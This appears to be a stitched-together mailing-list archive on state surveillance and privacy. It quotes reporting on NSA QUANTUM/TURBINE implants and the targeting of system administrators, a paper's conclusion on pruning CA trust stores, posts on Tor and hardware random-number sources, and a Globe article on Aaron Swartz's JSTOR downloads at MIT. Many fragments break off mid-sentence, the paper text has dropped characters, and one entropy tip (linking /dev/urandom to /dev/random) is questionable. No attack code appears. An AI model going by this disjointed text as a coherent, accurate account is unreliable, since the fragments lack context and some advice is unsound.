agency had the ability to covertly access Belgacom's systems since at
least 2010.
Infiltrating cellphone networks, however, is not all that the malware
can be used to accomplish. The NSA has specifically tailored some of
its implants to infect large-scale network routers used by Internet
service providers in foreign countries. By compromising routers - the
devices that connect computer networks and transport data packets
across the Internet - the agency can gain covert access to monitor
Internet traffic, record the browsing sessions of users, and intercept
Two implants the NSA injects into network routers, HAMMERCHANT and
HAMMERSTEIN, help the agency to intercept and perform "exploitation
attacks" against data that is sent through a Virtual Private Network,
a tool that uses encrypted "tunnels" to enhance the security and
privacy of an Internet session.
The implants also track phone calls sent across the network via Skype
and other Voice Over IP software, revealing the username of the person
making the call. If the audio of the VOIP conversation is sent over
the Internet using unencrypted "Real-time Transport Protocol" packets,
the implants can covertly record the audio data and then return it to
the NSA for analysis.
But not all of the NSA's implants are used to gather intelligence, the
secret files show. Sometimes, the agency's aim is disruption rather
than surveillance. QUANTUMSKY, a piece of NSA malware developed in
2004, is used to block targets from accessing certain websites.
QUANTUMCOPPER, first tested in 2008, corrupts a target's file
downloads. These two "attack" techniques are revealed on a classified
list that features nine NSA hacking tools, six of which are used for
intelligence gathering. Just one is used for "defensive" purposes - to
protect U.S. government networks against intrusions.
"Mass exploitation potential"
Before it can extract data from an implant or use it to attack a
system, the NSA must first install the malware on a targeted computer
or network.
According to one top-secret document from 2012, the agency can deploy
malware by sending out spam emails that trick targets into clicking a
malicious link. Once activated, a "back-door implant" infects their
computers within eight seconds.
There's only one problem with this tactic, codenamed WILLOWVIXEN:
According to the documents, the spam method has become less successful
in recent years, as Internet users have become wary of unsolicited
emails and less likely to click on anything that looks suspicious.
Consequently, the NSA has turned to new and more advanced hacking
techniques. These include performing so-called "man-in-the-middle" and
"man-on-the-side" attacks, which covertly force a user's internet
browser to route to NSA computer servers that try to infect them with
an implant.
To perform a man-on-the-side attack, the NSA observes a target's
Internet traffic using its global network of covert "accesses" to data
as it flows over fiber optic cables or satellites. When the target
visits a website that the NSA is able to exploit, the agency's
surveillance sensors alert the TURBINE system, which then "shoots"
data packets at the targeted computer's IP address within a fraction
of a second.
In one man-on-the-side technique, codenamed QUANTUMHAND, the agency
disguises itself as a fake Facebook server. When a target attempts to
log in to the social media site, the NSA transmits malicious data
packets that trick the target's computer into thinking they are being
sent from the real Facebook. By concealing its malware within what
looks like an ordinary Facebook page, the NSA is able to hack into the
targeted computer and covertly siphon out data from its hard drive. A
top-secret animation demonstrates the tactic in action.
The documents show that QUANTUMHAND became operational in October
2010, after being successfully tested by the NSA against about a dozen
According to Matt Blaze, a surveillance and cryptography expert at the
University of Pennsylvania, it appears that the QUANTUMHAND technique
is aimed at targeting specific individuals. But he expresses concerns
about how it has been covertly integrated within Internet networks as
part of the NSA's automated TURBINE system.
"As soon as you put this capability in the backbone infrastructure,
the software and security engineer in me says that's terrifying,"
Blaze says.
"Forget about how the NSA is intending to use it. How do we know it is
working correctly and only targeting who the NSA wants? And even if it
does work correctly, which is itself a really dubious assumption, how
is it controlled?"
In an email statement to The Intercept, Facebook spokesman Jay
Nancarrow said the company had "no evidence of this alleged activity."
He added that Facebook implemented HTTPS encryption for users last
year, making browsing sessions less vulnerable to malware attacks.
Nancarrow also pointed out that other services besides Facebook could
have been compromised by the NSA. "If government agencies indeed have
privileged access to network service providers," he said, "any site
running only [unencrypted] HTTP could conceivably have its traffic
A man-in-the-middle attack is a similar but slightly more aggressive
method that can be used by the NSA to deploy its malware. It refers to
a hacking technique in which the agency covertly places itself between
computers as they are communicating with each other.
This allows the NSA not only to observe and redirect browsing
sessions, but to modify the content of data packets that are passing
between computers.
The man-in-the-middle tactic can be used, for instance, to covertly
change the content of a message as it is being sent between two
people, without either knowing that any change has been made by a
third party. The same technique is sometimes used by criminal hackers
to defraud people.
A top-secret NSA presentation from 2012 reveals that the agency
developed a man-in-the-middle capability called SECONDDATE to
"influence real-time communications between client and server" and to
"quietly redirect web-browsers" to NSA malware servers called FOXACID.
In October, details about the FOXACID system were reported by the
Guardian, which revealed its links to attacks against users of the
Internet anonymity service Tor.
But SECONDDATE is tailored not only for "surgical" surveillance
attacks on individual suspects. It can also be used to launch bulk
malware attacks against computers.
According to the 2012 presentation, the tactic has "mass exploitation
potential for clients passing through network choke points."
Blaze, the University of Pennsylvania surveillance expert, says the
potential use of man-in-the-middle attacks on such a scale "seems very
disturbing." Such an approach would involve indiscriminately
monitoring entire networks as opposed to targeting individual
"The thing that raises a red flag for me is the reference to 'network
choke points,'" he says. "That's the last place that we should be
allowing intelligence agencies to compromise the infrastructure -
because that is by definition a mass surveillance technique."
To deploy some of its malware implants, the NSA exploits security
vulnerabilities in commonly used Internet browsers such as Mozilla
Firefox and Internet Explorer.
The agency's hackers also exploit security weaknesses in network
routers and in popular software plugins such as Flash and Java to
deliver malicious code onto targeted machines.
The implants can circumvent anti-virus programs, and the NSA has gone
to extreme lengths to ensure that its clandestine technology is
extremely difficult to detect. An implant named VALIDATOR, used by the
NSA to upload and download data to and from an infected machine, can
be set to self-destruct - deleting itself from an infected computer
after a set time expires.
In many cases, firewalls and other security measures do not appear to
pose much of an obstacle to the NSA. Indeed, the agency's hackers
appear confident in their ability to circumvent any security mechanism
that stands between them and compromising a computer or network. "If
we can get the target to visit us in some sort of web browser, we can
probably own them," an agency hacker boasts in one secret document.
"The only limitation is the 'how.'"
Covert Infrastructure
The TURBINE implants system does not operate in isolation.
It is linked to, and relies upon, a large network of clandestine
surveillance "sensors" that the agency has installed at locations
across the world.
The NSA's headquarters in Maryland are part of this network, as are
eavesdropping bases used by the agency in Misawa, Japan and Menwith
Hill, England.
The sensors, codenamed TURMOIL, operate as a sort of high-tech
surveillance dragnet, monitoring packets of data as they are sent
across the Internet.
When TURBINE implants exfiltrate data from infected computer systems,
the TURMOIL sensors automatically identify the data and return it to
the NSA for analysis. And when targets are communicating, the TURMOIL
system can be used to send alerts or "tips" to TURBINE, enabling the
initiation of a malware attack.
The NSA identifies surveillance targets based on a series of data
"selectors" as they flow across Internet cables. These selectors,
according to internal documents, can include email addresses, IP
addresses, or the unique "cookies" containing a username or other
identifying information that are sent to a user's computer by websites
such as Google, Facebook, Hotmail, Yahoo, and Twitter.
Other selectors the NSA uses can be gleaned from unique Google
advertising cookies that track browsing habits, unique encryption key
fingerprints that can be traced to a specific user, and computer IDs
that are sent across the Internet when a Windows computer crashes or
What's more, the TURBINE system operates with the knowledge and
support of other governments, some of which have participated in the
malware attacks.
Classification markings on the Snowden documents indicate that NSA has
shared many of its files on the use of implants with its counterparts
in the so-called Five Eyes surveillance alliance - the United Kingdom,
Canada, New Zealand, and Australia.
GCHQ, the British agency, has taken on a particularly important role
in helping to develop the malware tactics. The Menwith Hill satellite
eavesdropping base that is part of the TURMOIL network, located in a
rural part of Northern England, is operated by the NSA in close
cooperation with GCHQ.
Top-secret documents show that the British base - referred to by the
NSA as "MHS" for Menwith Hill Station - is an integral component of
the TURBINE malware infrastructure and has been used to experiment
with implant "exploitation" attacks against users of Yahoo and
In one document dated 2010, at least five variants of the QUANTUM
hacking method were listed as being "operational" at Menwith Hill. The
same document also reveals that GCHQ helped integrate three of the
QUANTUM malware capabilities - and test two others - as part of a
surveillance system it operates codenamed INSENSER.
GCHQ cooperated with the hacking attacks despite having reservations
about their legality. One of the Snowden files, previously disclosed
by Swedish broadcaster SVT, revealed that as recently as April 2013,
GCHQ was apparently reluctant to get involved in deploying the QUANTUM
malware due to "legal/policy restrictions." A representative from a
unit of the British surveillance agency, meeting with an obscure
telecommunications standards committee in 2010, separately voiced
concerns that performing "active" hacking attacks for surveillance
"may be illegal" under British law.
In response to questions from The Intercept, GCHQ refused to comment
on its involvement in the covert hacking operations. Citing its
boilerplate response to inquiries, the agency said in a statement that
"all of GCHQ's work is carried out in accordance with a strict legal
and policy framework which ensures that our activities are authorized,
necessary and proportionate, and that there is rigorous oversight."
Whatever the legalities of the United Kingdom and United States
infiltrating computer networks, the Snowden files bring into sharp
focus the broader implications. Under cover of secrecy and without
public debate, there has been an unprecedented proliferation of
aggressive surveillance techniques. One of the NSA's primary concerns,
in fact, appears to be that its clandestine tactics are now being
adopted by foreign rivals, too.
"Hacking routers has been good business for us and our 5-eyes partners
for some time," notes one NSA analyst in a top-secret document dated
December 2012. "But it is becoming more apparent that other nation
states are honing their skillz [sic] and joining the scene."

cultivating expertise and rewarding it with hacking toys, access, and
4) Privileged Positioning
Direct and unrestricted backbone access to various individuals or

6 Conclusion
In this paper we argued for the removal of CA certi cates that do not
sign any certi cates used in HTTPS connections from desktop and browser
trust stores. We based our analysis on an Internet-wide dataset of 48
million HTTPS certi cates and compared them to trust stores from all
major browser and OS vendors. We were able to identify 140 CA
certi cates included in twelve trust stores from all major platforms
that are never used for signing certi cates used in HTTPS. Based on
these ndings, we suggest to remove or restrict these CA certi cates.
Using two months' worth of TLS handshake data from our university
network, we con rmed that removing these certi cates from users' trust
stores would not result in a single HTTPS warning message. Thus, this
action provides a simple and low-cost real-world improvement that users
can implement right now to make their HTTPS connections more secure. We
are working on creating tools and scripts to automate this process for
diﬀerent browsers and operating systems.
Our current list of CAs we recommend for removal is a conservative one.
It includes all CAs that have never signed a HTTPS certi cate. In future
work,we would like to analyze the trade-oﬀ between false positives and
the size of the trust store, as well as look into mechanisms to restrict
the capabilities of certi cates on the Android platform.

gather somebody's communications they have to target them
specifically. They can't just target everybody all the time and then
when they want to read your stuff they go back in a time machine and
say what did they say you know in 2006. They can't pitch exploits in
every computer in the world without getting caught. That is the value
of end to end encryption and that is what we need to be thinking

having observed domestic LE (inc. FBI) in action and military systems
in action, they usually have distinct and different characteristics:
LE specific and narrow and by the book and for the record, this is a
specific focus they give attention.
Military any-and-all-means-to-the-end less discriminating, brute
strength ground out the solution by force majeure method.
the DC 19 rogue base stations DITU DRT technique was in-discriminant
(until it had to be :)
and yet the DC 20 NSA TAO/QUANTUM*.* style "in the towers" absurd over
kill attacks were also absolutely precise - if your "selector"(phone)
was not on the list you'd never know [without some fancy watching
close to target, perhaps?].  if you were indeed on the shitlist, every
sensor, stored byte, and key material got compromised instantly; your
airplane mode is funny cute.
... presumably "anything in range of the Rio and our multiwatt amps"
they argued was targeted and limited.
as for had to be discriminating, if you want to load test spook gear
just figure out what drives their automation and then jam the fuck to
11 on that signal.

advantages inherent in attacker perspective! fork bombs and kernel

can such a tasking pass my PCI PA-DSS audit for me??
"Imagine a master list of all admins of all networks on earth..."
'Inside the NSA's Secret Efforts to Hunt and Hack System Administrators'
 -    also, slides:
      Across the world, people who work as system administrators keep
computer networks in order - and this has turned them into unwitting
targets of the National Security Agency for simply doing their jobs.
According to a secret document provided by NSA whistleblower Edward
Snowden, the agency tracks down the private email and Facebook
accounts of system administrators (or sys admins, as they are often
called), before hacking their computers to gain access to the networks
they control.
The document consists of several posts - one of them is titled "I hunt
sys admins" - that were published in 2012 on an internal discussion
board hosted on the agency's classified servers. They were written by
an NSA official involved in the agency's effort to break into foreign
network routers, the devices that connect computer networks and
transport data across the Internet. By infiltrating the computers of
system administrators who work for foreign phone and Internet
companies, the NSA can gain access to the calls and emails that flow
over their networks.
The classified posts reveal how the NSA official aspired to create a
database that would function as an international hit list of sys
admins to potentially target. Yet the document makes clear that the
admins are not suspected of any criminal activity - they are targeted
only because they control access to networks the agency wants to
infiltrate. "Who better to target than the person that already has the
'keys to the kingdom'?" one of the posts says.
The NSA wants more than just passwords. The document includes a list
of other data that can be harvested from computers belonging to sys
admins, including network maps, customer lists, business
correspondence and, the author jokes, "pictures of cats in funny poses
with amusing captions." The posts, boastful and casual in tone,
contain hacker jargon  (pwn, skillz, zomg, internetz) and are
punctuated with expressions of mischief. "Current mood: devious,"
reads one, while another signs off, "Current mood: scheming."
The author of the posts, whose name is being withheld by The
Intercept, is a network specialist in the agency's Signals
Intelligence Directorate, according to other NSA documents. The same
author wrote secret presentations related to the NSA's controversial
program to identify users of the Tor browser - a privacy-enhancing
tool that allows people to browse the Internet anonymously. The
network specialist, who served as a private contractor prior to
joining the NSA, shows little respect for hackers who do not work for
the government. One post expresses disdain for the quality of
presentations at Blackhat and Defcon, the computer world's premier
security and hacker conferences:
It is unclear how precise the NSA's hacking attacks are or how the
agency ensures that it excludes Americans from the intrusions. The
author explains in one post that the NSA scours the Internet to find
people it deems "probable" administrators, suggesting a lack of
certainty in the process and implying that the wrong person could be
targeted. It is illegal for the NSA to deliberately target Americans
for surveillance without explicit prior authorization. But the
employee's posts make no mention of any measures that might be taken
to prevent hacking the computers of Americans who work as sys admins
for foreign networks. Without such measures, Americans who work on
such networks could potentially fall victim to an NSA infiltration
The NSA declined to answer questions about its efforts to hack system
administrators or explain how it ensures Americans are not mistakenly
targeted. Agency spokeswoman Vanee' Vines said in an email statement:
"A key part of the protections that apply to both U.S. persons and
citizens of other countries is the mandate that information be in
support of a valid foreign intelligence requirement, and comply with
U.S. Attorney General-approved procedures to protect privacy rights."
As The Intercept revealed last week, clandestine hacking has become
central to the NSA's mission in the past decade. The agency is working
to aggressively scale its ability to break into computers to perform
what it calls "computer network exploitation," or CNE: the collection
of intelligence from covertly infiltrated computer systems. Hacking
into the computers of sys admins is particularly controversial because
unlike conventional targets - people who are regarded as threats - sys
admins are not suspected of any wrongdoing.
In a post calling sys admins "a means to an end," the NSA employee
writes, "Up front, sys admins generally are not my end target. My end
target is the extremist/terrorist or government official that happens
to be using the network some admin takes care of."
The first step, according to the posts, is to collect IP addresses
that are believed to be linked to a network's sys admin. An IP address
is a series of numbers allocated to every computer that connects to
the Internet. Using this identifier, the NSA can then run an IP
address through the vast amount of signals intelligence data, or
SIGINT, that it collects every day, trying to match the IP address to
personal accounts.
"What we'd really like is a personal webmail or Facebook account to
target," one of the posts explains, presumably because, whereas IP
addresses can be shared by multiple people, "alternative selectors"
like a webmail or Facebook account can be linked to a particular
target. You can "dumpster-dive for alternate selectors in the big
SIGINT trash can" the author suggests. Or "pull out your wicked
Google-fu" (slang for efficient Googling) to search for any "official
and non-official e-mails" that the targets may have posted online.
Once the agency believes it has identified a sys admin's personal
accounts, according to the posts, it can target them with its
so-called QUANTUM hacking techniques. The Snowden files reveal that
the QUANTUM methods have been used to secretly inject surveillance
malware into a Facebook page by sending malicious NSA data packets
that appear to originate from a genuine Facebook server. This method
tricks a target's computer into accepting the malicious packets,
allowing the NSA to infect the targeted computer with a malware
"implant" and gain unfettered access to the data stored on its hard
"Just pull those selectors, queue them up for QUANTUM, and proceed
with the pwnage," the author of the posts writes. ("Pwnage," short for
"pure ownage," is gamer-speak for defeating opponents.) The author
adds, triumphantly, "Yay! /throws confetti in the air."
In one case, these tactics were used by the NSA's British counterpart,
Government Communications Headquarters, or GCHQ, to infiltrate the
Belgian telecommunications company Belgacom. As Der Speigel revealed
last year, Belgacom's network engineers were targeted by GCHQ in a
QUANTUM mission named "Operation Socialist" - with the British agency
hacking into the company's systems in an effort to monitor
While targeting innocent sys admins may be surprising on its own, the
"hunt sys admins" document reveals how the NSA network specialist
secretly discussed building a "master list" of sys admins across the
world, which would enable an attack to be initiated on one of them the
moment their network was thought to be used by a person of interest.
One post outlines how this process would make it easier for the NSA's
specialist hacking unit, Tailored Access Operations (TAO), to
infiltrate networks and begin collecting, or "tasking," data:
Aside from offering up thoughts on covert hacking tactics, the author
of these posts also provides a glimpse into internal employee
complaints at the NSA. The posts describe how the agency's spies gripe
about having "dismal infrastructure" and a "Big Data Problem" because
of the massive volume of information being collected by NSA
surveillance systems. For the author, however, the vast data troves
are actually something to be enthusiastic about.
"Our ability to pull bits out of random places of the Internet, bring
them back to the mother-base to evaluate and build intelligence off of
is just plain awesome!" the author writes. "One of the coolest things
about it is how much data we have at our fingertips."

everything old is new again,

this is why some technology consumers demand independent validation[0]
to confirm to their own eyes if design matches intent; if operation
matches assurance.  how can you even trust the word of a third party
verifying integrity if you can't determine integrity yourself?
caution: this line of reasoning leads to long dependencies...  ;)
the beauty of privacy, like freedom, is that it floats all boats.
  [ i may not agree with what you do with free, uncensored communication,
    yet i code and toil for your ability to communicate regardless. ]
in all seriousness, what you describe at the root of things: systems
that are inherently and fundamentally compromising, if you have the
right adversary, if you have the right resources, is absolutely true!
in industry speak this is characterized in terms of "risk management".
 in military, aimed at a higher common denominator, yet fundamentally
just as vulnerable (built to a more competent attacker.  a larger
resource stream.)
there are defeatists a plenty, having looked around the state of
things, and fall to nothing but despair.
i think it is reasonable to demand complete transparency and utmost
correctness and reliability in these technologies we depend on.
that's a radically different future than what we have now or can think
of in terms of current engineering capabilities.
  never the less, a future worth aiming toward!
finally, to your mention of the meeting with NSA, this is interesting
from a reversing the adversary's perspective.
  [since presumably Roger does not hold clearance of course, this is
all treating Roger as hostile witness!]
let's review it:

the usual culprits.
next time ask for them to sponsor bridges, obfuscated proxies, and
fast exits? :)
[only half in jest, as QUANTUMSQUIRREL would also make a great single,
large exit for entire Tor network as has been mentioned in the past!
constantly changing set of address space would avoid censorship and
blocking into and out of the network. (though i would _only_ use
NSANet as a obfuscated proxy first hop to hidden services or as last
hop exit relay to clearnet where they occurr no where else along my

  again, the beauty of anonymity is that it floats all boats...
[e.g. magically getting mutually distrusting, even opposed entities to
cooperate on a shared goal.]
yup, a nice summation.  from here it gets a bit more interesting...
note the knowing, smily face at end. they either had started on or
already had the ability to detect anomalous circuits, likely based
around active/targeted DoS among who knows how many other
possibilities they've been working on since "Tor stinks" :-)
unfortunately anything further that would be useful would also be
classified and thus not in this doc. [pointers and future articles
back to boring fact taking again... *yawn*
it has become so much better since 2007!
great progress here too, i think.

that's it.  one bone, in the whole unclassified pile.
  so where's the docs with the circa 2011/2012 state-of-the-art Tor attacks?

References: <3735791.WCR3VjPavv
speaking as a security enthusiasts and attending venues where hostile
networks are expected and common, i can sum up my personal position
1. Tor has worked in environments where no other communication could.
this includes situations where everything not-Tor was blocked or
actively attacked.  for this reason alone i believe it is an
indispensable tool in the security practitioner's toolbox.
2. Exit nodes should be considered hostile.  you'll be wrong most of
the time (by design) but it doesn't hurt to remember that plain-text
is not only observed but trivially manipulated through exit relays.
3. Defense in depth! Not only do 0day happen, but also accidents,
oversights, catastrophes, the slow march of time...  This can mean
running a live Tor distro like Tails or constructing a series of
isolated VMs for research on Qubes with a Tor Proxy VM.
as for the concerns about identifying Tor users, the latest Tor
bundles and Tails image have support for obfuscated proxies into the
Tor network and other bridges.  if Tor use alone is a concern, you're
doing OPSEC wrong and/or living where obfuscated proxies are

References: <20140322193813.GP29711
fwd, and added comment at end about a "upstream distribution" of repute.
---------- Forwarded message ----------
this too, a much longer discussion.  we are in agreement, though one point:
when FreeBSD decided against direct use of _both_ RDRAND and XSTORE,
it was not an equal dismissal.  RDRAND is specifically, and
intentionally designed without direct access to the physical entropy
sources, while XSTORE allows direct access to a userspace entropy
daemon through the MSR configuration bits.
XSTORE in raw mode, to userspace entropy daemon (rngd) that
continously monitors for catastrophic failure (as above), and then
_conservatively_ digests and folds the entropy before adding to OS
kernel entropy pool is a robust configuration.
RDRAND and RDSEED inherently crippled - if you had to pick a design,
you would pick raw access with open and independent validation of
run-time behavior with configurable conservative'ness as you so chose.
instead, NIST and FIPS push _hard_ on opaque designs without raw
access.  in turn, US Gov pushes vendors hard for NIST/FIPS compliance.
 this is just one stream of influence working against the interest of
users and strong privacy.
if you really want to do entropy without repute:
 1.: it starts with development and distribution, where every host and
runtime is seeded with distinct mastering entropy that is mixed on
first boot.**
 2.: every physical host contains two (redundant) physical entropy
sources run in continuous verification with immediate halt/panic on
dual physical source failure.
 3.: opportunistic entropy gathering daemons also running on host
including haveged, dakarand, and kernel interrupt and activity
 4.: virtio-random device support feed into guest OSes from host
entropy pool. (Qemu, KVM, Vbox, etc.)
 5.: at shutdown of physical host entropy state is saved to FDE
protected root volume for re-incorporation into entropy state on next
 6.: as signal of care, in all mastering images and runtime ensure
that /dev/urandom links to /dev/random special device.
 7.: use the strace to confirm in every application that appropriate
entropy from /dev/*random is read when generating keys or nonces.

ok. this is sounding like classic traffic analysis (on the "metadata"
rather than the content, so to speak).
Tor cells use padding, but this alone is not sufficient to defeat
traffic analysis.

the anonymity set is large, but maybe that isn't sufficient.
this is exactly the same argument for or against zero knowledge mixes.
sure, they offer stronger protection from traffic analysis, but the
anonymity set of users is tiny, making that theoretical hardness
useless in practical terms.
depending on where you stand, and what network you egress, it may make
absolutely perfect sense - Tor use alone drawing scrutiny that draws
from my personal experience, _not_ in places where Tor use alone is
suspect, it has been a essential tool.
if you're concerned about NSA/TAO/SSO then you're speaking of two
broad domains of concern:
1. pervasive, passive global intercept - this is where Tor and
encryption come in.  you've just made it harder, and turned something
global and passive ineffective, pushing activity toward:
2. tailored access - the black bag jobs, weaponized exploits, HUMINT

achieved a COMSEC and symbolic victory.

The inside story of MIT and Aaron Swartz
More than a year after Swartz killed himself rather than face
prosecution, questions about MIT's handling of the hacking case
 By Marcella Bombardieri | Globe Staff   March 30, 2014
CAMBRIDGE -- The mysterious visitor called himself Gary Host at first,
then Grace Host, which he shortened for his made-up e-mail address to
"ghost," a joke apparently, perhaps signaling mischievousness -- or
menace. The intruder was lurking somewhere on the MIT campus,
downloading academic journal articles by the hundreds of thousands.
The interloper was eventually traced to a laptop under a box in a
basement wiring closet. He was Aaron Swartz, a brilliant young
programmer and political activist. The cascade of events that followed
would culminate in tragedy: a Secret Service investigation, a federal
prosecution, and ultimately Swartz's suicide.
But in the fall of 2010, Swartz was still a stranger in the shadows,
and the university faced a hard question: How big a threat was the
"ghost" downloader? And a harder one: What should be done about him?
Answering those questions would prove a particularly knotty puzzle for
the Massachusetts Institute of Technology, a place long supportive of
the free flow of information and so famously friendly to pranks, known
in MIT lingo as hacks, that a book published by the MIT Museum in the
1990s offered pranksters such tips as "always have two ways to run."
And yet, MIT is a cradle of world-class scientific research with
unpublished data and unpatented inventions on its network, and its
leaders felt vulnerable to the rising tide of high-tech espionage.
"There is some speculation that this might have been an MIT student
experimenting with a robot," one MIT employee noted in an e-mail after
a second breach by Swartz was discovered. But another pointed out that
"sinister foreigners'' may have stolen credentials or compromised a
MIT's efforts to track down Swartz, while under intense pressure from
JSTOR, the not-for-profit that ran the journal database, eventually
would lead to felony computer crimes charges that might have brought
years in jail. Swartz, 26, was under indictment when he committed
suicide in January 2013.
Critics, both on campus and around the world, have accused MIT of
abandoning its values celebrating inventive risk-taking by helping to
doom a young man whose project -- likely an act of civil disobedience
to make information freely available -- didn't in the end cause serious
MIT has insisted it maintained an appropriate, even compassionate,
neutrality toward a determined hacker who stole 4.8 million articles
and eluded numerous efforts to stop him before the college sought help
from police.
But MIT's brand of neutrality proved one with notable limits,
according to a Globe review of more than 7,000 pages of discovery
documents -- many of them e-mails -- from Swartz's court case. In the
wake of his death, both MIT and JSTOR posted online documents that
they had turned over to authorities, a trove that drew little if any
notice at the time. The Globe also obtained a number of e-mails
related to the case not available publicly.
Only with a patient review of the complete record does the full
picture of the dilemma MIT faced become clear. The aftershocks of the
choices the institution made in the wake of the "ghost" continue to
reverberate, on campus and off, more than a year after Swartz's death.
Most vividly, the e-mails underscore the dissonant instincts the
university grappled with. There was the eagerness of some MIT
employees to help investigators and prosecutors with the case, and
then there was, by contrast, the glacial pace of the institution's
early reaction to the intruder's provocation.
MIT, for example, knew for 2 1/2 months which campus building the
downloader had operated out of before anyone searched it for him or
his laptop -- even as the university told JSTOR they had no way to
identify the interloper.
And once Swartz was unmasked, the ambivalence continued. MIT never
encouraged Swartz's prosecution, and once told his prosecutor they had
no interest in jail time. However, e-mails illustrate how MIT
energetically assisted authorities in capturing him and gathering
evidence -- even prodding JSTOR to get answers for prosecutors more
quickly -- before a subpoena had been issued.
In a handful of e-mails, individual MIT employees involved in the case
aired sentiments that were far from neutral. One, for example, gushed
to prosecutor Stephen P. Heymann about the quality of the indictment
of Swartz.
"Nicely done Steve and kudos! All points . . . are as accurate as I've
ever seen," wrote the information technology employee. "(I only say
that because every time I've ever given an interview, details are
always slightly to horribly munged; not that I ever expected any less,
it's just a true relief and very refreshing to see your accuracy and
Yet if MIT eventually adopted a relatively hard line on Swartz, the
university had also helped to make his misdeeds possible, the Globe
review found. Numerous e-mails make it clear that the unusually easy
access to the campus computer network, which Swartz took advantage of,
had long been a concern to some of the university's information
technology staff.
Some at MIT believed that officials had failed to pay serious
attention to what one person called "poor, limited, or outdated
security protections" on resources like the JSTOR database.
The documents also put JSTOR's role in the case in a new light. In
contrast to MIT, the journal archive organization has been widely
hailed for publicly distancing itself from Swartz's prosecution,
declaring that once Swartz returned the documents, it "had no interest
in this becoming an ongoing legal matter."
But a number of JSTOR's internal e-mails show a much angrier face in
the months that Swartz eluded capture, with employees sharing
frustration about MIT's "rather tepid level of concern." JSTOR
officials repeatedly raised the prospect, among themselves, of going
to the police, e-mails show.
"What's wrong with us . . . alerting the cyber-crimes division of law
enforcement and initiating an investigation, having a cop search a
dorm room and try to retrieve any hard drive that contains our
content?" asked one JSTOR official, whose name -- like most -- was
redacted in the released documents.
In the end, JSTOR neither called the police nor asked MIT to do so,
according to its president.
Eric Grimson, who recently stepped down as chancellor of MIT, defended
the university's handling of the case as a judicious effort to protect
the community without seeking retribution. MIT's first steps, he said,
were simply to deny the downloader access to the network. They didn't
search for the laptop for many weeks because they thought he had been
When Swartz proved undeterred, he said, MIT had to do more.
"We were confronted with a situation of an unknown user accessing our
network," he said in an interview, "using it to download massive
amounts of material . . . for a three-month period, and evading our
efforts to try and stop it."
MIT was harmed in the process, Grimson said, with 10,000 researchers
denied an important resource for several days as JSTOR sought to cut
off the mass downloading.
Helping investigators pursue the campus intruder was the only
reasonable course, he said.
"I think we should as a matter of principle cooperate with law
enforcement in an investigation of an alleged crime being committed on
our campus," he said. "That's protecting our community."
After Swartz's arrest, Grimson said, the university went out of its
way to be fair to the defense, voluntarily making staff members
available to answer questions from Swartz's attorneys.
"I would like to suggest we took a path to try to balance being
empathetic to Aaron's situation while acknowledging that there was a
legal process involved," he said.
Allure of openness
Swartz was an Internet prodigy. By age 19, he had helped to build RSS,
a service that allowed users to create personalized news feeds; to
develop the social news website Reddit; and to establish Creative
Commons, an alternative to traditional copyright more friendly to
In his 20s, the restless Stanford dropout turned his energies to
political activism. He helped launch several progressive political
groups and was a major force behind a national wave of protest against
the Stop Online Piracy Act, which targeted unauthorized sharing of
videos and music, but which Swartz and others saw as an attack on free
While Swartz's motive for downloading the JSTOR archive remains
unknown, there is one simple and plausible possibility: to make
academic research freely available to the public. In 2008, he
published a "Guerrilla Open Access Manifesto" in which he avowed a
"moral imperative" to share scholarship locked behind exorbitant
subscription walls.
"It's time to come into the light and, in the grand tradition of civil
disobedience, declare our opposition to this private theft of public
culture," he wrote.
But why use MIT as his gateway -- or, to some eyes, his victim? He had
a fellowship at Harvard at the time, which gave him access to JSTOR,
but apparently worried about getting himself or his colleagues in hot
water, since bulk downloading is forbidden by JSTOR.
Since MIT had been known for generations for its idealistic devotion
to the spirit of openness, venturing a couple of miles down
Massachusetts Avenue may have seemed irresistible to Swartz. He had no
formal tie to the university but had friends there and had been
involved in campus activities.
A blog entry Swartz wrote in 2009, titled "Honest Theft," neatly
details his view of the school as a haven for rebelliousness. He
described friends who he said secretly lived for free on campus,
sleeping on couches in common rooms and stealing food from the
cafeterias -- and using the money they saved "to promote the public
"MIT has a notoriously relaxed security policy," he wrote, so his
friends "likely wouldn't get in too much trouble."
Indeed, MIT's own 180-page internal report on the Swartz case,
released in July by a panel led by professor Hal Abelson, described a
"culture of creative disobedience where students are encouraged to
explore secret corners of the campus, commit good-spirited acts of
vandalism . . . and resist restrictions that seem arbitrary or
Student "hacks" have included putting a faux firetruck on the MIT
Great Dome and turning a high-rise facade into a working Tetris game.
They are meant to be public and harmless, but often involve
trespassing and "borrowing" materials without permission, like a 3-ton
cannon brazenly snatched from Caltech.
The ethic of openness extends to MIT's computer network, where anyone
on campus can get onto the wired network for 14 days by logging on as
a guest, an extremely unusual perk for visitors to a university
As an MIT manager of network security noted in an e-mail reviewing the
downloading case as it unfolded in October 2010, misuse of the MIT
network was made possible by the fact that there was "no
authentication of visitors" and "no identity verification."
The open-door policy meant Swartz could easily sign in, as he did, as
an anonymous guest with fake names and disposable e-mail addresses.
Between 5 p.m. on Sept. 25, 2010, and 4 a.m. the next morning, the
code Swartz wrote, which he called "keepgrabbing," downloaded 450,000
JSTOR articles.
It was the opening salvo in a cat-and-mouse game that would extend
over three months. JSTOR would cut off the Internet protocol address
Swartz was using; he would switch to another. MIT detected and shut
down the registration for his computer; he altered his computer's
identifying information.
Officials would conclude the ghost downloader had moved on, then he'd
reappear weeks later.
The maddening pursuit prompted some MIT technology personnel to say,
essentially, I told you so. Databases like JSTOR's, some said, should
have been kept behind a virtual gate -- though this would inconvenience
legitimate users.
"I frankly don't know why it's not used more," an employee wrote about
such a security measure.
Another employee in network security lamented that only the Swartz
case prompted MIT to smarten up. "I hope it helps enlighten them to
the need to really think long and hard about these issues. Kind of
silly that it took a JSTOR crawling issue to get everyone a little
MIT and JSTOR did agree to a security upgrade after Swartz's second
round of downloading was discovered in October 2010, requiring those
seeking access to have MIT credentials. But it took JSTOR weeks to
prepare for the change, the e-mails show.
That delay would prove fateful. Aaron Swartz had only gotten started.
Drawing concern at JSTOR
Given the institution's global stature, MIT inevitably drew most of
the public focus. But what Swartz did was more of a threat to JSTOR, a
small organization in a precarious position. Its business is selling
access to journal articles, but it doesn't own those articles. If it
can't protect them, the journals could yank their material out of the
library and threaten JSTOR's survival.
Swartz ultimately downloaded 80 percent of JSTOR's archive, 4.8
million articles. At one point his downloading was so rapid, JSTOR
e-mails said it created "a monstrous amount" of traffic that was
"threatening the website."
The stakes for MIT were murkier. The university's contract with JSTOR
promised that it would guard against misuse, so there was some risk of
losing an important library resource. And a rogue stranger poking
around MIT's network could be truly dangerous. The discovery shortly
